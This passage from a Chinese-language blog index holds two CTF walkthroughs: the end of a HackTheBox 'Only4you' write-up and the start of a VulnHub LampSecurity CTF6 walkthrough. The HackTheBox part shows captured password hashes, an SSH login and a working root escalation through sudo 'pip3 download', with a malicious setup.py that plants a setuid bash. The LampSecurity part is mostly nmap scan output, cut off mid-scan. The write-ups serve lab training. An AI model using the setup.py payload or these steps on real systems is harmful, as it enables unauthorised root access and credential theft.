/?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:03] &quot;GET /?username=admin HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:04] &quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:04] &quot;GET /?username=john HTTP/1.1&quot; 200 -\n\n我们拿到了admin和john的密码哈希，admin的不用看了，就是admin的，看看john的是啥，丢到hashes破解一下。\n\n提权到user拿到密码，直接尝试ssh登录john，发现成功登录。\n$ ssh john@10.10.11.210john@10.10.11.210&#x27;s password:Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Mon 24 Jul 2023 12:18:20 PM UTC  System load:  0.06              Processes:             239  Usage of /:   84.7% of 6.23GB   Users logged in:       0  Memory usage: 48%               IPv4 address for eth0: 10.10.11.210  Swap usage:   0% * Introducing Expanded Security Maintenance for Applications.   Receive updates to over 25,000 software packages with your   Ubuntu Pro subscription. Free for personal use.     https://ubuntu.com/proExpanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsjohn@only4you:~$\n\njohn的home目录就能拿到user flag。\n提权到rootjohn@only4you:~$ sudo -lMatching Defaults entries for john on only4you:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser john may run the following commands on only4you:    (root) NOPASSWD: /usr/bin/pip3 download http\\://127.0.0.1\\:3000/*.tar.gz\n\n我们发现john有无密码执行/usr/bin/pip3 download http\\://127.0.0.1\\:3000/*.tar.gz的权限。我们之前已经发现3000端口是一个gogs服务，我们该怎么利用呢？不管怎么说，先搜一下pip3 download exploit再说。\n谷歌一下就能发现，pip3 download存在代码执行的漏洞。Pip Download Code Execution。那就来作用了，我们按着这个漏洞的POC操作一下。\nmkdir expcd expvim setup.pymkdir srctouch src/__init__.pyecho &#x27;print(&quot;hello&quot;)&#x27; &gt; src/main.py\n\nsetup.py的内容。\n# setup.pyfrom setuptools import setup, find_packagesfrom setuptools.command.install import installfrom setuptools.command.egg_info import egg_infodef RunCommand():\t# Arbitrary code here!\timport os;os.system(&quot;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&quot;)class RunEggInfoCommand(egg_info):    def run(self):        RunCommand()        egg_info.run(self)class RunInstallCommand(install):    def run(self):        RunCommand()        install.run(self)setup(    name = &quot;exp&quot;,    version = &quot;0.0.1&quot;,    license = &quot;MIT&quot;,    packages=find_packages(),    cmdclass=&#123;        &#x27;install&#x27; : RunInstallCommand,        &#x27;egg_info&#x27;: RunEggInfoCommand    &#125;,)\n\n然后python3 -m build一下，会在dist目录下生成exp-0.0.1.tar.gz。\n然后我们传到gogs上，再执行一下sudo就搞定了。\nGogs的登录密码就用john的登录凭证，密码复用真是方便。直接进行一个文件的传。直接传到现有的Test的仓库就行，新建一个也行，但是反正速度要快，速度慢了仓库会被自动清掉。\n\n然后还没收工，如果随便选一个地方pip download你会发现会报错，要先把仓库clone现在，在里面操作才行。\n错误：\njohn@only4you:/tmp$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gzCollecting http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz  ERROR: HTTP error 404 while getting http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz  ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz because of error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gzERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz because of HTTP error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz for URL http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz\n\n正确：\njohn@only4you:/tmp$ git clone http://127.0.0.1:3000/john/Test.gitCloning into &#x27;Test&#x27;...Username for &#x27;http://127.0.0.1:3000&#x27;: johnPassword for &#x27;http://john@127.0.0.1:3000&#x27;:remote: Enumerating objects: 6, done.remote: Counting objects: 100% (6/6), done.remote: Compressing objects: 100% (4/4), done.remote: Total 6 (delta 0), reused 0 (delta 0)Unpacking objects: 100% (6/6), 1.47 KiB | 300.00 KiB/s, done.john@only4you:/tmp$ cd Test/john@only4you:/tmp/Test$ ls -latotal 20drwxrwxr-x  3 john john 4096 Jul 24 13:37 .drwxrwxrwt 35 root root 4096 Jul 24 13:37 ..-rw-rw-r--  1 john john 1016 Jul 24 13:37 exp-0.0.1.tar.gzdrwxrwxr-x  8 john john 4096 Jul 24 13:37 .git-rw-rw-r--  1 john john   12 Jul 24 13:37 README.mdjohn@only4you:/tmp/Test$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gzCollecting http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz  File was already downloaded /tmp/Test/exp-0.0.1.tar.gzSuccessfully downloaded exp\n\n我们回到tmp里面就会看到我们的rootbash了。\njohn@only4you:/tmp$ ls -latotal 13488drwxrwxrwt 35 root     root        4096 Jul 24 13:38 .drwxr-xr-x 17 root     root        4096 Mar 30 11:51 ........-rwsr-sr-x  1 root     root     1183448 Jul 24 13:38 rootbash......john@only4you:/tmp$ ./rootbash -prootbash-5.0# iduid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)rootbash-5.0# whoamirootrootbash-5.0# cd /rootrootbash-5.0# ls -altotal 48drwx------  5 root root   4096 Mar 30 12:10 .drwxr-xr-x 17 root root   4096 Mar 30 11:51 ..lrwxrwxrwx  1 root root      9 Nov 30  2022 .bash_history -&gt; /dev/null-rw-r--r--  1 root root   3106 Dec  5  2019 .bashrcdrwxr-xr-x  3 root neo4j  4096 Mar 14 11:19 .cache-rw-------  1 root root     35 Mar 30 12:10 .lesshstlrwxrwxrwx  1 root root      9 Dec  8  2022 .mysql_history -&gt; /dev/null-rw-r--r--  1 root root    161 Dec  5  2019 .profile-rw-r-----  1 root root     33 Jul 24 07:58 root.txtdrwxr-xr-x  2 root root   4096 Mar 30 11:51 scriptsdrwx------  2 root root   4096 Mar 29 09:56 .ssh-rw-------  1 root root  12283 Mar 30 10:59 .viminforootbash-5.0#\n\n成功拿下。\n总结这台机子综合考察了代码审计能力以及对文件包含漏洞需要查看哪些敏感文件的理解，还要求我们掌握内网穿透以及内网服务发现能力。考察的面还是比较广的，有些难度。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[vulnhub]  LampSec-CTF6","url":"/2023/05/24/LampSecurity:%20CTF6/","content":"\n\n\n信息收集nmap主机发现\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -sn 192.168.56.0/24         [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:02 CSTNmap scan report for 192.168.56.1Host is up (0.00020s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.00023s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.140Host is up (0.00046s latency).MAC Address: 00:0C:29:5C:75:70 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00021s latency).MAC Address: 00:50:56:FE:21:A5 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 4.06 seconds\n端口扫描\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.140Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:03 CSTNmap scan report for 192.168.56.140Host is up (0.0026s latency).Not shown: 65525 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http110/tcp  open  pop3111/tcp  open  rpcbind143/tcp  open  imap443/tcp  open  https624/tcp  open  cryptoadmin993/tcp  open  imaps995/tcp  open  pop3s3306/tcp open  mysqlMAC Address: 00:0C:29:5C:75:70 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.68 seconds\nUDP端口扫描\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.140Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:06 CSTWarning: 192.168.56.140 giving up on port because retransmission cap hit (10).Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP ScanUDP Scan Timing: About 52.44% done; ETC: 11:08 (0:00:34 remaining)Nmap scan report for 192.168.56.140Host is up (0.0026s latency).Not shown: 65453 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)PORT    STATE SERVICE111/udp open  rpcbindMAC Address: 00:0C:29:5C:75:70 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.95 seconds\nTCP扫描，服务识别，OS识别\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap -sT -sV -O -p22,80,110,111,143,443,624,993,995,3306 192.168.56.140Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:08 CSTNmap scan report for 192.168.56.140Host is up (0.00049s latency).PORT     STATE SERVICE  VERSION22/tcp   open  ssh      OpenSSH 4.3 (protocol 2.0)80/tcp   open  http     Apache httpd 2.2.3 ((CentOS))110/tcp  open  pop3     Dovecot pop3d111/tcp  open  rpcbind  2 (RPC #100000)143/tcp  open  imap     Dovecot imapd443/tcp  open  ssl/http Apache httpd 2.2.3 ((CentOS))624/tcp  open  status   1 (RPC #100024)993/tcp  open  ssl/imap Dovecot imapd995/tcp  open  ssl/pop3 Dovecot pop3d3306/tcp open  mysql    MySQL 5.0.45MAC Address: 00:0C:29:5C:75:70 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6OS details: Linux 2.6.9 - 2.6.30Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds\n可用信息很多。反正还是先从80看起吧。\n漏洞扫描\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nmap --script=vuln 192.168.56.140                                      Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 11:10 CSTNmap scan report for 192.168.56.140Host is up (0.0028s latency).Not shown: 991 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http| http-enum: |   /mail/: Mail folder|   /logs/: Logs (401 Authorization Required)|   /phpmyadmin/: phpMyAdmin|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /docs/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /files/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /icons/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /inc/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /js/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /lib/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /manual/: Potentially interesting folder|   /sql/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|_  /templates/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.140:80/?action=login|     Form id: |     Form action: ?action=login|     |     Path: http://192.168.56.140:80/mail/|     Form id: rcmlogintz|_    Form action: ./|_http-trace: TRACE is enabled110/tcp  open  pop3| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574111/tcp  open  rpcbind143/tcp  open  imap| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574443/tcp  open  https| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| ssl-dh-params: |   VULNERABLE:|   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140|   Found the following possible CSRF vulnerabilities: |     |     Path: https://192.168.56.140:443/mail/|     Form id: rcmlogintz|     Form action: ./|     |     Path: https://192.168.56.140:443/?action=login|     Form id: |     Form action: ?action=login|     |     Path: https://192.168.56.140:443/mail/?_task=mail|     Form id: rcmlogintz|_    Form action: ./| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-cookie-flags: |   /: |     PHPSESSID: |       secure flag not set and HTTPS in use|_      httponly flag not set|_http-trace: TRACE is enabled|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)| http-enum: |   /mail/: Mail folder|   /logs/: Logs (401 Authorization Required)|   /phpmyadmin/: phpMyAdmin|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /docs/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /files/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /icons/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /inc/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /js/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /lib/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|   /manual/: Potentially interesting folder|   /sql/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;|_  /templates/: Potentially interesting directory w/ listing on &#x27;apache/2.2.3 (centos)&#x27;993/tcp  open  imaps|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt995/tcp  open  pop3s|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-dh-params: |   VULNERABLE:|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability|     State: VULNERABLE|       Transport Layer Security (TLS) services that use anonymous|       Diffie-Hellman key exchange only provide protection against passive|       eavesdropping, and are vulnerable to active man-in-the-middle attacks|       which could completely compromise the confidentiality and integrity|       of any data exchanged over the resulting session.|     Check results:|       ANONYMOUS DH GROUP 1|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://www.ietf.org/rfc/rfc2246.txt|   |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)|     State: VULNERABLE|     IDs:  CVE:CVE-2015-4000  BID:74733|       The Transport Layer Security (TLS) protocol contains a flaw that is|       triggered when handling Diffie-Hellman key exchanges defined with|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker|       to downgrade the security of a TLS session to 512-bit export-grade|       cryptography, which is significantly weaker, allowing the attacker|       to more easily break the encryption and monitor or tamper with|       the encrypted stream.|     Disclosure date: 2015-5-19|     Check results:|       EXPORT-GRADE DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 512|             Generator Length: 8|             Public Key Length: 512|     References:|       https://weakdh.org|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000|       https://www.securityfocus.com/bid/74733|   |   Diffie-Hellman Key Exchange Insufficient Group Strength| 